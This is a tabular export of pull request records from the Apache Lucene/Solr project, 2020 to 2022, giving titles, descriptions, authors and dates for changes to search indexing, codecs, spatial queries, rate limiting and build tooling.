"","2155","LUCENE-9641: Support for spatial relationships in LatLonPoint","This PR adds the possibility of querying a LatLonPoint using the same spatial relationships supported by LatLonShape. In order to do that, I have rename ShapeQuery class to SpatialQuery and added  a new Interface (SpatialVisitor) that can be implemented by both points and shapes.  LatLonPointInGeometryQuery has been replaced by LatLonPointQuery. LatLonDocValuesPointInGeometryQuery has been replaced by LatLonDocValuesQuery.  Performance test for LatLonPoint shows same performance as before:  ``` ||Approach||Shape||M hits/sec      ||QPS            ||Hit count      ||                  ||Dev||Base ||Diff||Dev||Base||Diff||Dev||Base||Diff|| |points|polyRussia|16.08|16.13|-0%|4.58|4.60|-0%|3508846|3508846| 0%| |points|polyMedium|9.14|9.08| 1%|112.00|111.28| 1%|2693559|2693559| 0%| |points|poly 10|87.29|87.03| 0%|55.20|55.03| 0%|355809475|355809475| 0%| ```   cc: @nknize","closed","","iverase","2020-12-17T14:43:48Z","2021-01-08T08:21:10Z"
"","1907","LUCENE-9538: Detect polygon self-intersections in the Tessellator","This PR adds a check in the tessellator to detect self-intersections so it can provide a more meaningful error to the user.  cc: @nknize","closed","","iverase","2020-09-22T08:23:19Z","2021-11-04T13:21:16Z"
"","2593","LUCENE-10154 NumericLeafComparator to define getPointValues","This patch adds getPointValues to NumericLeafComparatorsimilar how it has getNumericDocValues.  Numeric Sort optimization with points relies on the assumption that points and doc values record the same information, as we substitute iterator over doc_values with one over points.  If we override getNumericDocValues it almost certainly means that whatever PointValues NumericComparator is going to look at shouldn't be used to skip non-competitive documents. Returning null for pointValues in this case will force comparator NOT to use sort optimization with points, and continue with a traditional way of iterating over doc values.  Backport for https://github.com/apache/lucene/pull/364","closed","","mayya-sharipova","2021-10-25T14:04:05Z","2021-10-25T14:21:11Z"
"","2037","LUCENE-9583: extract separate RandomAccessVectorValues interface","This moves the random access vector interface out of VectorValues with the idea of making it less prominent. All implementations still support it, and it is required by the codec, but the public-facing VectorValues api becomes cleaner.","closed","","msokolov","2020-10-26T18:22:21Z","2020-11-13T14:15:14Z"
"","2649","Remove '-' between base.version and version.suffix and change common-build to allow the new format","This may still not be ideal/acceptable but allows for having internal version numbers in the `x.y.z.a` format instead of `x.y.z-a` format.","closed","","anshumg","2022-03-18T22:39:25Z","2022-05-31T16:20:21Z"
"","1762","LUCENE-9447: Make BEST_COMPRESSION better with highly compressible data.","This makes BEST_COMPRESSION split blocks into sub blocks and use preset dictionaries to improve compression ratios.","closed","","jpountz","2020-08-19T13:55:29Z","2020-08-26T09:04:46Z"
"","2050","SOLR-14926: Modernize and clean up search results clustering contrib.","This issue upgrades the clustering contrib to the new Carrot2 4.x line, dropping several CVE-prone dependencies along the way.  The parameters and configuration of the contrib extensions have changed. The documentation in Solr ref guide has been rewritten from scratch to be up to date.  Clustering code has been rewritten from scratch to work properly regardless of the mode (standalone, distributed).  The API has been stripped of ancient, unused, interfaces and simplified.","closed","","dweiss","2020-10-30T12:36:09Z","2020-11-03T08:31:53Z"
"","2579","SOLR-15269: Upgrade Apache HttpComponents Client to 4.5.13 to fix CVE-2020-13956","This is the fix for [CVE-2020-13956](https://nvd.nist.gov/vuln/detail/CVE-2020-13956) .","closed","","ventry1990","2021-09-21T12:44:52Z","2021-10-11T23:26:45Z"
"","2180","SOLR-15058: Enforce node_name contains colon and port and find first underscore after colon to parse context   when converting a node_name to a base URL","This is the backport from master to 8x See original PR: https://github.com/apache/lucene-solr/pull/2178","closed","","thelabdude","2021-01-05T20:20:16Z","2021-01-05T20:24:53Z"
"","1871","SOLR-14789: Rename docker tests task, adding missing credit in CHANGES","This is so that the docker tests do not run by default on the Apache Jenkins test jobs.","closed","","HoustonPutman","2020-09-14T14:32:23Z","2020-09-14T14:55:48Z"
"","1735","LUCENE spell: Implement SuggestWord.toString","This is simply an obvious toString impl on SuggestWord.","closed","","dsmiley","2020-08-11T04:55:32Z","2020-08-11T16:45:50Z"
"","2643","SOLR-9359 Make Config API work for warming queries","This is my attempt at resolving https://issues.apache.org/jira/browse/SOLR-9359 - it's still very work-in-progress, hence all the debug output etc, but if anyone has thoughts on it please let me know.  I don't know if there's a better way to do this without all the `getClass()`/`instanceof` checking?  With this patch in place it becomes possible to send `add/update-listener` commands to the Config API like this, and they take effect as expected rather than throwing a `ClassCastException`:  ``` {   ""update-listener"": {     ""name"": ""warming-queries"",     ""event"": ""newSearcher"",     ""class"": ""solr.QuerySenderListener"",     ""queries"": [       [         {           ""q"": ""foo""         },         {           ""q"": ""bar""         }       ]     ]   } } ```  Note the nested array: without that, only the first query in the list is picked up - the rest don't appear in the `getArgs().get(""queries"")` response at all. I don't know if that's fixable but I suspect it'd require more widespread changes so I've steered clear of that thus far.  (Also, this class is virtually the same in the new Solr repo - I'd raise a PR for that too, and also update the appropriate tests/docs.)","closed","","andywebb1975","2022-02-22T20:25:02Z","2022-05-31T15:51:10Z"
"","1718","SOLR-14702: Add Upgrade Notes and CHANGES entry","This is just the CHANGES.txt entries, including upgrade notes CC @MarcusSorealheis","closed","","tflobbe","2020-08-05T22:11:10Z","2020-08-07T17:12:18Z"
"","1962","SOLR-14749 Provide a clean API for cluster-level event processing","This is just the API part of the ticket, separated from PR-1758 to facilitate reviews of pure API.","closed","user-facing,","sigram","2020-10-08T10:27:11Z","2020-11-05T11:24:45Z"
"","1964","SOLR-14749: Cluster singleton part of PR-1785","This is just the `ClusterSingleton` part, with an example implementation that loads the ClusterSingleton plugins via `CustomerContainerPlugins` API. See `TestContainerPlugin` to see how it works.","closed","","sigram","2020-10-08T11:45:57Z","2020-10-22T11:29:58Z"
"","2176","Initial rewrite of MMapDirectory for JDK-16 preview (incubating) Panama APIs (>= JDK-16-ea-b32)","This is just a draft PR for a first insight on memory mapping improvements in JDK 16+.  Some background information: Starting with JDK-14, there is a new incubating module ""jdk.incubator.foreign"" that has a new, not yet stable API for accessing off-heap memory (and later it will also support calling functions using classical MethodHandles that are located in libraries like .so or .dll files). This incubator module has several versions: - first version: https://openjdk.java.net/jeps/370 (slow, very buggy and thread confinement, so making it unuseable with Lucene) - second version: https://openjdk.java.net/jeps/383 (still thread confinement, but now allows transfer of ""ownership"" to other threads; this is still impossible to use with Lucene. - third version in JDK 16: https://openjdk.java.net/jeps/393 (this version has included ""Support for shared segments""). This now allows us to safely use the same external mmaped memory from different threads and also unmap it!  This module more or less overcomes several problems: - ByteBuffer API is limited to 32bit (in fact MMapDirectory has to chunk in 1 GiB portions) - There is no official way to unmap ByteBuffers when the file is no longer used. There is a way to use `sun.misc.Unsafe` and forcefully unmap segments, but any IndexInput accessing the file from another thread will crush the JVM with SIGSEGV or SIGBUS. We learned to live with that and we happily apply the unsafe unmapping, but that's the main issue.  @uschindler had many discussions with the team at OpenJDK and finally with the third incubator, we have an API that works with Lucene. It was very fruitful discussions (thanks to @mcimadamore !)  With the third incubator we are now finally able to do some tests (especially performance). As this is an incubating module, this PR first changes a bit the build system: - disable `-Werror` for `:lucene:core` - add the incubating module to compiler of `:lucene:core` and enable it for all test builds. This is important, as you have to pass `--add-modules jdk.incubator.foreign` also at runtime!  The code basically just modifies `MMapDirectory` to use LONG instead of INT for the chunk size parameter. In addition it adds `MemorySegmentIndexInput` that is a copy of our `ByteBufferIndexInput` (still there, but unused), but using MemorySegment instead of ByteBuffer behind the scenes. It works in exactly the same way, just the try/catch blocks for supporting EOFException or moving to another segment were rewritten.  The openInput code uses `MemorySegment.mapFile()` to get a memory mapping. This method is unfortunately a bit buggy in JDK-16-ea-b30, so I added some workarounds. See JDK issues: https://bugs.openjdk.java.net/browse/JDK-8259027, https://bugs.openjdk.java.net/browse/JDK-8259028, https://bugs.openjdk.java.net/browse/JDK-8259032, https://bugs.openjdk.java.net/browse/JDK-8259034. The bugs with alignment and zero byte mmaps are fixed in b32, this PR was adapted (hacks removed).  It passes all tests and it looks like you can use it to read indexes. The default chunk size is now 16 GiB (but you can raise or lower it as you like; tests are doing this). Of course you can set it to Long.MAX_VALUE, in that case every index file is always mapped to one big memory mapping. My testing with Windows 10 have shown, that this is *not a good idea!!!*. Huge mappings fragment address space over time and as we can only use like 43 or 46 bits (depending on OS), the fragmentation will at some point kill you. So 16 GiB looks like a good compromise: Most files will be smaller than 6 GiB anyways (unless you optimize your index to one huge segment). So for most Lucene installations, the number of segments will equal the number of open files, so Elasticsearch huge user consumers will be very happy. The sysctl max_map_count may not need to be touched anymore.  In addition, this implements `readLELongs` in a better way than @jpountz did (no caching or arbitrary objects). Nevertheless, as the new MemorySegment API relies on final, unmodifiable classes and coping memory from a MemorySegment to a on-heap Java array, it requires us to wrap all those arrays using a MemorySegment each time (e.g. in `readBytes()` or `readLELongs`), there may be some overhead du to short living object allocations (those are NOT reuseable!!!). _In short: In future we should throw away on coping/loading our stuff to heap and maybe throw away IndexInput completely and base our code fully on random access. The new foreign-vector APIs will in future also be written with MemorySegment in its focus. So you can allocate a vector view on a MemorySegment and let the vectorizer fully work outside java heap inside our mmapped files! :-)_  It would be good if you could checkout this branch and try it in production.  But be aware: - You need JDK 11 to run Gradle (set `JAVA_HOME` to it) - You need JDK 16-ea-b32 (set `RUNTIME_JAVA_HOME` to it) - The lucene-core.jar will be JDK16 class files and requires JDK-16 to execute. - Also you need to add `--add-modules jdk.incubator.foreign` to the command line of your Java program/Solr server/Elasticsearch server  It would be good to get some benchmarks, especially by @rmuir or @mikemccand. _Take your time and enjoy the complexity of setting this up!_ ;-)  My plan is the following: - report any bugs or slowness, especially with Hotspot optimizations. The last time I talked to Maurizio, he taked about Hotspot not being able to fully optimize for-loops with long instead of int, so it may take some time until the full performance is there. - wait until the final version of project PANAMA-foreign goes into Java's Core Library (no module needed anymore) - add a MR-JAR for lucene-core.jar and compile the MemorySegmentIndexInput and maybe some helper classes with JDK 17/18/19 (hopefully?).  ~~In addition there are some comments in the code talking about safety (e.g., we need `IOUtils.close()` taking `AutoCloseable` instead of just `Closeable`, so we can also enfoce that all memory segments are closed after usage.~~ In addition, by default all VarHandles are aligned. By default it refuses to read a LONG from an address which is not a multiple of 8. I had to disable this feature, as all our index files are heavily unaliged. We should in meantime not only convert our files to little endian, but also make all non-compressed types (like `long[]` arrays or non-encoded integers be aligned to the correct boundaries in files). The most horrible thing I have seen is that our CFS file format starts the ""inner"" files totally unaligned. We should fix the CFSWriter to start new files always at multiples of 8 bytes. I will open an issue about this.","closed","optimization,","uschindler","2021-01-02T14:42:30Z","2021-06-07T12:15:06Z"
"","1917","LUCENE-9535: Make ByteBuffersDataOutput#ramBytesUsed run in constant-time.","This is called transitively from `DocumentsWriterFlushControl#doAfterDocument` which is synchronized and appears to be a point of contention.","closed","","jpountz","2020-09-23T16:38:41Z","2020-09-24T14:12:10Z"
"","2544","SOLR-15570: Check stored or docValues when merging fields from the Luke schema response","This is an additional change needed for: https://github.com/apache/lucene-solr/commit/1acb34753bcb771586b8b4010417e79f80952205","closed","","thelabdude","2021-08-02T17:59:25Z","2021-08-02T19:07:16Z"
"","1679","SOLR-14656: Removing autoscaling from master","This is a PR for removing autoscaling framework from master. We need this to free up @murblanc and @sigram to start afresh with the new autoscaling framework design and implementation from a clean slate.  This removes: * Autoscaling, policy, triggers etc. * withCollection handling * UTILIZENODE command * Sim framework * Suggestions tab in UI * Reference guide pages for autoscaling * autoAddReplicas feature  (This PR is meant only for master. The deprecation on 8x will be done via a separate PR.)","closed","deprecation,","chatman","2020-07-16T23:22:19Z","2020-10-08T11:15:56Z"
"","1836","LUCENE-9317: Clean up split package in analyzers-common","This is a draft pull request for review, to try to clean up package name conflicts between `analyzers-common` and `core`. Also I tried to make necessary changes as small as possible.  See https://issues.apache.org/jira/browse/LUCENE-9317 for more background.  The main changes are:  - Move analysis base classes to lucene-core (o.a.l.a) from analyzers-common (o.a.l.a.util) - Rename all service provider files (META-INF/services/...). - Move o.a.l.a.standard.StandardTokenizer to lucene-core - Split o.a.l.a.standard in analyzers-common into o.a.l.a.classic and o.a.l.a.email  With above changes, there is no package name conflicts.  - `o.a.l.a.util` and newly created `o.a.l.a.classic` and `o.a.l.a.email` only exist in `analyzers-common` - `o.a.l.a.standard` only exists in `lucene-core` - other packages are not touched.  Compiling whole Lucene/Solr main classes are fine, thanks to IDE's refactoring feature.  Tasks to be done:  - Create fake factory base classes in o.a.l.a.util for backward compatibility (?) - Fix tests - Fix gradle scripts (?)","closed","","mocobeta","2020-09-06T13:01:35Z","2020-09-28T07:54:54Z"
"","2148","SOLR-15052: Per-replica states for reducing overseer bottlenecks (branch_8x)","This is a branch_8x based PR. Design and performance numbers are mentioned in the associated JIRA.  This introduces: 1. A flag, perReplicaStates=true/false, for a collection (param to be passed during CREATE) to opt into this feature. By default this is false. 2. Support for MODIFYCOLLECTION to convert an existing collection into this new mode, or vice versa.  Important places to look: PerReplicaStates.java, ZkStateWriter.java, ZkStateReader.java, ZkController.java etc.  Co-authored-by: Noble Paul","closed","","chatman","2020-12-16T10:20:32Z","2021-01-07T15:38:24Z"
"","2487","SOLR-15383 Solr Zookeeper status page shows green even when a ZK is down","This is a backport to 8.9 of https://github.com/apache/solr/pull/103  See https://issues.apache.org/jira/browse/SOLR-15383","closed","","janhoy","2021-04-29T21:12:37Z","2021-04-29T21:47:13Z"
"","2664","[8.11] Backport - LUCENE-9580: Don't introduce collinear edges when splitting polygon","This is a backport of https://github.com/apache/lucene-solr/pull/2452 onto 8.11.  I currently use Lucene through Elasticsearch and am stuck for some time with ES 7.17 that is shipped with Lucene 8.11. I'd like to have this tessellation bug fixed in a future ES 7.17 release. This is a first step in that direction.","closed","","mhugo","2022-06-24T13:27:25Z","2022-06-27T07:34:13Z"
"","2497","LUCENE-9950: New facet counting implementation for general string doc value fields","This is a backport of #133 in apache/lucene. Only a couple very minor changes in the unit tests to work with JDK8.","closed","","gsmiller","2021-05-18T21:28:54Z","2021-05-31T13:33:54Z"
"","2507","LUCENE-9946: Support multi-value fields in range facet counting","This is a backport from `lucene/main`.","closed","","gsmiller","2021-06-07T20:43:17Z","2021-06-24T13:30:11Z"
"","2584","LUCENE-10070: Skip deleted documents during facet counting for all documents","This is a backport and identical to PR #2577 (which I managed to mangle somehow when trying to merge over changes)","closed","","gsmiller","2021-09-27T18:26:49Z","2021-10-05T12:51:50Z"
"","2018","LUCENE-9582: rename VectorValues.ScoreFunction to SearchStrategy","This is - renaming as the title says, plus a light refactoring, and adding `o.a.l.util.VectorUtil` to house the score function implementations.","closed","","msokolov","2020-10-21T22:55:19Z","2020-10-23T21:39:45Z"
"","1919","Compute RAM usage ByteBuffersDataOutput on the fly.","This helps remove the assumption that all blocks have the same size.","closed","","jpountz","2020-09-24T14:46:13Z","2020-09-28T13:09:29Z"
"","1802","LUCENE-9215: replace checkJavaDocs.py with doclet","This has the same logic as the previous python, but no longer relies upon parsing HTML output, instead using java's doclet processor.  The errors are reported like ""normal"" javadoc errors with source file name and line number and happen when running ""gradlew javadoc""  Although the ""rules"" are the same as the previous python, the python had some bugs where the checker didn't quite do exactly what we wanted, so some fixes were applied throughout.  NOTE: I'm aware this isn't perfect, but I think it is much better than what we had before.  The branch is pushed so if you want to help, push commits :)","closed","","rmuir","2020-08-30T04:02:59Z","2020-09-02T12:29:28Z"
"","1671","LUCENE-9427: Ensure unified highlighter considers all terms in fuzzy query.","This fixes a regression where if a fuzzy query corresponds to an exact match (for example it has maxEdits: 0), then the unified highlighter doesn't produce highlights for the matching terms.  The proposed fix is to always pass back an automaton when visiting a fuzzy query. This seems to match the previous behavior before the regression was introduced.","closed","","jtibshirani","2020-07-14T17:49:26Z","2020-08-06T17:54:55Z"
"","2028","LUCENE-9322: Make sure to account for vectors in SortingCodecReader.","This ensures that vector values are sorted when sorting an index after-the-fact using `SortingCodecReader`.","closed","","jtibshirani","2020-10-25T20:54:55Z","2020-10-26T15:59:02Z"
"","1841","SOLR 13528: Move Rate Limiter Configuration To Be A Plugin","This commit refactors rate limiters configuration to now be modelled as a plugin and move its configuration from web.xml to a dedicated section in solr.xml","open","","atris","2020-09-08T09:40:29Z","2020-09-09T10:56:42Z"
"","1785","Update Circuit Breaker configured as a standard plugin","This commit refactors circuit breaker configurations to use PluginInfo and reduce the footprint on SolrConfig.","closed","","atris","2020-08-26T05:21:46Z","2020-08-27T08:36:23Z"
"","2576","LUCENE-10089: Disable numeric sort optimization early","This commit moves the responsibility to disable the numeric sort optimization on comparators to the SortField. This way we don't need to apply the logic on every top field collectors.  backport for: https://github.com/apache/lucene/pull/291  Co-authored-by: Jim Ferenczi","closed","","mayya-sharipova","2021-09-16T13:15:19Z","2021-09-16T13:29:58Z"
"","1906","SOLR-13528: Implement API Based Config For Rate Limiters","This commit moves rate limiters configuration from web.xml to clusterprops.json and allows setting the configuration using a newly added command.","closed","","atris","2020-09-22T07:51:26Z","2020-09-28T09:27:07Z"
"","2131","LUCENE-9552: make sure we don't construct Illegal rectangles due to quantization","This commit just add a correction in the minLat/maxLat when it becomes invalid during quantisation.  CC: @nknize","closed","","iverase","2020-12-08T08:07:20Z","2020-12-14T11:17:18Z"
"","1686","SOLR-13528: Implement Request Rate Limiters","This commit introduces two functionalities: request rate limiting and ability to identify requests based on type (indexing, search, admin). The default rate limiter rate limits query requests based on configurable parameters which can be set in web.xml. Note that this rate limiting works at a JVM level, not a core/collection level.","closed","","atris","2020-07-21T19:47:32Z","2020-08-07T20:06:49Z"
"","2403","SOLR-15164: Implement Task Management Interface","This commit introduces the concept of task management in Solr. Tasks can be marked as cancellable (thus, trackable) and can then be listed (ps -all), cancelled and specific task's status be queried.  This commit also implements SOLR-15165 and LUCENE-9789.  Please refer to the JIRA for more information.","closed","","atris","2021-02-19T05:30:28Z","2021-04-15T08:05:55Z"
"","1737","SOLR-14615: Implement CPU Utilization Based Circuit Breaker","This commit introduces CPU based circuit breaker. This circuit breaker tracks the average CPU load per minute and triggers if the value exceeds a configurable value.  This commit also adds a specific control flag for Memory Circuit Breaker to allow enabling/disabling the same.","closed","","atris","2020-08-11T08:48:18Z","2020-08-20T07:51:47Z"
"","2494","LUCENE-9935: Enable bulk merge for stored fields with index sort","This commit enables bulk-merges (i.e., raw chunk copying) for stored fields when index sort is enabled.","closed","","dnhatn","2021-05-13T01:58:19Z","2021-05-16T20:47:24Z"
"","2059","LUCENE-9595: Make Component2D#withinPoint implementations consistent with ShapeQuery logic","This commit changes the logic of Component2D#withinPoint to return WithinRelation.NOTWITHIN when the point is inside the component.","closed","","iverase","2020-11-03T09:55:32Z","2020-11-23T08:37:55Z"
"","2395","LUCENE-9616: Add developer docs on how to update a format.","This commit adds simple guidelines on how to make a change to a file format: * Document how the 'copy-on-write' approach works with backwards-codecs * Clarify that we prefer to copy the format instead of using internal versions","closed","","jtibshirani","2021-02-18T00:21:08Z","2021-02-22T19:02:42Z"
"","1736","Harden RequestRateLimiter Tests","This commit adds higher data size and load in the test path. Also improves the asserts that are performed.","closed","","atris","2020-08-11T07:23:30Z","2020-08-11T17:12:54Z"
"","2338","LUCENE-9756: Extend FieldInfosFormat tests to cover points and vectors","This commit adds coverage to `BaseFieldInfoFormatTestCase ` for points, vectors, and the soft deletes field.","closed","","jtibshirani","2021-02-10T01:43:50Z","2021-02-10T16:57:29Z"
"","2381","SOLR-8138: Simple UI for issuing SQL queries","This code was mostly written by Michael Suzuki in PR https://github.com/apache/lucene-solr/pull/180,  i just tweaked it to load in Solr 9, and updated the version of ui-grid to the 4.10 version.     * SOLR-####:   LUCENE and SOLR must be fully capitalized. A short description helps people scanning pull requests for items they can work on.  Properly referencing the issue in the title ensures that Jira is correctly updated with code review comments and commits. -->   # Description  Add a simple page to Solr Admin for doing SQL queries.  # Solution  Delegates to the `qt=sql` handler and runs the query.  Displays results in basic table.  This UI shows how easy it is to write a SQL query that Solr doesn't like ;-(.   However, it's much easier to use than using Curl.   And may encourage more use of this powerful feature.  # Tests  Please describe the tests you've developed or run to confirm this patch implements the feature or solves the problem.  # Checklist  Please review the following and check all that apply:  - [X ] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [ X] I have created a Jira issue and added the issue ID to my pull request title. - [ X] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [X ] I have developed this patch against the `master` branch. - [ X] I have run `./gradlew check`. - [ ] I have added tests for my changes. - [X ] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","closed","","epugh","2021-02-16T19:24:32Z","2021-02-18T22:21:22Z"
"","2034","SOLR-14964: remove Autoscaling related withCollection and COLOCATED_WITH","This cleanup is related to SOLR-14656 ""Deprecate current autoscaling framework, remove from master"" that didn't remove everything related to ""withCollection"".","closed","","murblanc","2020-10-26T14:07:58Z","2020-10-26T18:11:18Z"
"","2087","LUCENE-9613: Split ordinals into blocks when it saves 10+% space.","This changes the way that doc values write ordinals so that Lucene splits into blocks if it would save more than 10% space, like we do for numeric fields. By the way, we are now using the same code path to write ordinals and numbers.","closed","","jpountz","2020-11-18T15:48:04Z","2021-06-16T09:45:46Z"
"","2221","LUCENE-9669: Restore Lucene70Codec","This change restores the Lucene70Codec for file format compatibility of indices that are created within the Lucene 7 major version. These indices can be opened via an expert API on DirectoryReader in read-only mode. Changes to these indices are prohibited and will be rejected by the IndexWriter. In fact, IndexWriter will not open an index that is created with a major version less than N-1 to the current major version.","closed","","s1monw","2021-01-19T10:01:53Z","2021-01-19T20:08:00Z"
"","1848","LUCENE-9515: Detach DWPT from DefaultIndexingChain","This change removes the DWPT dependency from DefaultIndexingChain and rather passes on the primitives needed for creating the chain.","closed","","s1monw","2020-09-09T08:30:15Z","2020-09-14T07:47:01Z"
"","2495","LUCENE-9827: backport avoiding wasteful recompression for small segments","This change has baked in master for a while and it is really a performance trap.   @jpountz mentioned he wanted to backport, but I figure'd I would take a stab, to try to help https://github.com/apache/lucene-solr/pull/2494 along too afterwards. This stuff is tricky, at the same time you get bad performance bugs for many use-cases if we don't fix the issues.  Note that backporting wasn't really walk in the park: * cherry-pick even with max'd out rename detection doesn't figure out LUCENE-9705 changes that well, some files had to be merged painfully. * massive style changes due to spotless in master makes for crazy diffs... * needed to bump version here (i just made it `VERSION_NUMCHUNKS`, rename later for LUCENE-9935 or bump again)  Tests pass locally here for me, but I didn't do anything exhaustive.","closed","","rmuir","2021-05-13T04:23:03Z","2021-05-13T14:32:26Z"
"","1908","LUCENE-9539: Use more compact datastructures for sorting doc-values","This change cuts over from object based datastructures to primitive / compressed datastructures.","closed","","s1monw","2020-09-22T08:52:16Z","2020-09-22T13:10:58Z"
"","2559","LUCENE-10051 Fix lucene branch_8x run ant run-task error","This bug is the same as LUCENE-10058, I filed a PR for each.","closed","","xiaoshi2013","2021-08-24T14:18:33Z","2021-09-07T14:14:24Z"
"","2123","SOLR-10732: short circuit calls to searcher#numDocs when base is empty","This avoids constructing redundant queries","open","","munendrasn","2020-12-07T05:58:03Z","2020-12-08T12:42:29Z"
"","1774","SOLR-14774: Create HealthCheckHandler in CoreContainer","This allows users to plug-in different implementations of the handler (they must extend HealthCheckHandler)  This PR also removes the HealthCheckHandler from the implicit SolrCore plugins","closed","","tflobbe","2020-08-22T03:57:03Z","2020-08-28T23:00:01Z"
"","2450","SOLR-15155: Let CloudHttp2SolrClient accept an external Http2SolrClient Builder","This allows configuring the internal client with things like timeouts, credentials, etc","closed","","tflobbe","2021-03-03T23:02:29Z","2021-03-12T22:45:18Z"
"","1685","LUCENE-9433: Remove Ant support from trunk","This adds the first pass at changing the documentation, especially README.md and ref guide files.  lucene/README.md is a major question, currently it has a nocommit in it.","closed","","ErickErickson","2020-07-20T23:15:51Z","2020-08-21T15:27:06Z"
"","2039","LUCENE-9587: Add '--illegal-access=deny' to test runner","This adds back the test runner option, so testing is strict with internal APIs.","closed","test-fix,","uschindler","2020-10-27T20:19:16Z","2020-10-27T22:28:29Z"
"","2069","LUCENE-9378: Make it possible to configure how to trade speed for compression on doc values.","This adds a switch to `Lucene80DocValuesFormat` which allows to configure whether to prioritize retrieval speed over compression ratio or the other way around. When prioritizing retrieval speed, binary doc values are written using the exact same format as before more aggressive compression got introduced.","closed","","jpountz","2020-11-09T17:57:35Z","2020-11-12T15:10:04Z"
"","2051","LUCENE-9594 Add linear function for FeatureField","This adds a linear function and newLinearQuery for FeatureField","closed","","mayya-sharipova","2020-10-30T20:52:36Z","2020-11-10T22:08:09Z"
"","1930","LUCENE-9322: add VectorValues to new Lucene90 codec","This adds a floating-point vector format building on the designs in Lucene-9004 and LUCENE-9322. This patch fully supports indexing and reading vectors with an iterator, and a random-access API. Support for search based on an NSW graph implementation is intended to follow soon, but I wanted to include the vector APIs that I needed to get that working, even though they are not yet used here, so eg it includes the definition of a scoring function and a nearest-neighbors search API, but no implementation of search yet. My intention is to keep the ANN implementation hidden, so graphs and other supporting data structures (eg we might want to support LSH or k-means clustering and so on) would be implementation details invoked by a configuration on the VectorField/VectorValues. At the moment you can specify a ScoringFunction, and it is implicit that NSW will be the result. In the future we could add another parameter to ScoringFunction and/or new functions to represent support for other algorithms.  Some open questions:   1. Should this be Lucene 9.0 only? In this patch I added Lucene90 Codec. If we do this then it would be awkward to backport. 2. It seems messy to have the ScoringFunction implementation in the main VectorValues interface API file. I'd appreciate any better suggestion for how to organize this. 3. Vector scoring can return negative numbers. I'd like to have first-class support for dot product distance (which can be negative) since that's what my consumers seem to have settled on. I don't think we need to be compatible with relevance scores, at least not directly in the KNN search API, but IDK maybe we should? We could renormalize/convert from dot-product scores to a positive score with math in the output layer where we return the scores. So far this is just specification question as there is no implementation of search yet. 4. I think there is room for improvement in some of the data structures used to map docids to dense vector ordinals and back. I'd appreciate comments on that, but maybe we could revisit in a fast follow-on issue?","closed","","msokolov","2020-09-29T15:58:46Z","2020-10-19T14:53:11Z"
"","2081","LUCENE-9413: Add CJKWidthCharFilter and its factory.","This adds a char filter (and its factory) which is the exact counterpart of o.a.l.a.cjk.CJKWidthFilter. The char filter would be useful especially for dictionary-based CJK analyzers; e.g. kuromoji.  https://issues.apache.org/jira/browse/LUCENE-9413","closed","","mocobeta","2020-11-14T19:11:37Z","2020-11-17T08:32:36Z"
"","2175","LUCENE-9652: DataInput.readFloats for use by Lucene90VectorReader","This adds `DataInput.readFloats`  and makes use of it in `Lucene90VectorReader`. The implementation and tests are essentially cloned from `readLELongs`. With these changes I observed definite speedups, although not as much as I expected from microbenchmarking. There's a fair amount of variability, but I see at least 20%, sometimes as much as 40% reduction in time for HnswGraph.search, as measured by KnnGraphTester.","closed","","msokolov","2020-12-31T16:48:00Z","2021-01-07T00:08:59Z"
"","2112","SOLR-14942: Move request registration to ContentStreamHandlerBase","This addresses review feedback [1] from David Smiley on Jira. It moves the request registration to the ContentStreamHandlerBase class instead of doing a hack-ish instanceof check inside HttpSolrCall.  [1] - https://issues.apache.org/jira/browse/SOLR-14942?focusedCommentId=17227639&page=com.atlassian.jira.plugin.system.issuetabpanels:comment-tabpanel#comment-17227639","closed","","shalinmangar","2020-12-01T13:45:21Z","2020-12-02T04:41:33Z"
"","2536","LUCENE-10032: Remove leafDocMaps from MergeState","These maps are no longer useful after LUCENE-8505.","closed","","dnhatn","2021-07-29T13:45:49Z","2021-07-29T14:45:07Z"
"","2105","Remove obsolete dev-tools scripts","These build files appear to be obsolete.  AFAICT, nothing calls them.  Let's delete them.","closed","","dsmiley","2020-11-28T22:17:25Z","2020-12-02T21:04:41Z"
"","1787","LUCENE-9483: Disable per-thread caching of buffers for decompression of stored fields.","These buffers can use lots of memory when the number of segments, threads or both is high.","closed","","jpountz","2020-08-26T09:25:28Z","2020-09-03T09:37:39Z"
"","1668","SOLR-13939: Extract any non-gradle related patches (deprecations, URL…","These are the thread leak changes from some work Mark Miller did quite a while ago. ""gradlew check"" passes, BUT I haven't examined the changes at all, I wanted to make it available ASAP for people to look at.  I don't even know if the approach _should_ be pushed. I've just mechanically grouped all the related changes in order to get a well-defined unit to examine.","closed","","ErickErickson","2020-07-13T13:01:18Z","2020-07-15T13:25:52Z"
"","1924","LUCENE-9544: Port Nori dictionary compilation","There is no script for Nori dictionary after the Ant build was deleted in [LUCENE-9433](https://issues.apache.org/jira/browse/LUCENE-9433).","closed","","danmuzi","2020-09-27T20:50:45Z","2020-09-28T09:44:33Z"
"","1795","LUCENE-9487: Add a null check on BooleanWeight","There is no null check for scorer in BooleanWeight.explain()  Signed-off-by: jeng832","closed","","jeng832","2020-08-28T13:11:06Z","2020-08-31T17:23:51Z"
"","2463","Install ACL package for Solr Docker tests Github action","There is currently an issue on the Ubuntu 20.04 github runner, with incorrect ownership being set for the `/var/solr` directory in the docker image.","closed","","HoustonPutman","2021-03-05T21:43:13Z","2021-03-05T23:29:44Z"
"","2103","Reconcile upgrade notes in master","The upgrade notes in ref-guide tends to sometimes be updated in 8.x branches only and not synced to master branch. This is an attempt, (inspired by and fixes #2102). I diffed the `branch_8x` version with master and saw that the 8x wording in most cases was more up to date. I tried to make sure that the updates are valid for 9.x, and skipped a few refguide links that I I believe may have been since removed, but have not tried to compile the refguide to detect its validity.","closed","","janhoy","2020-11-27T22:10:19Z","2020-12-02T22:28:08Z"
"","1881","SOLR-14876: Upgrade to zookeeper 3.6.2","The update netty ver 4.1.50 includes both security fixes and AArch64 performance improvements Refer release notes for detail: https://netty.io/news/2020/05/13/4-1-50-Final.html  Signed-off-by: odidev","closed","","odidev","2020-09-17T05:17:50Z","2020-09-21T01:33:35Z"
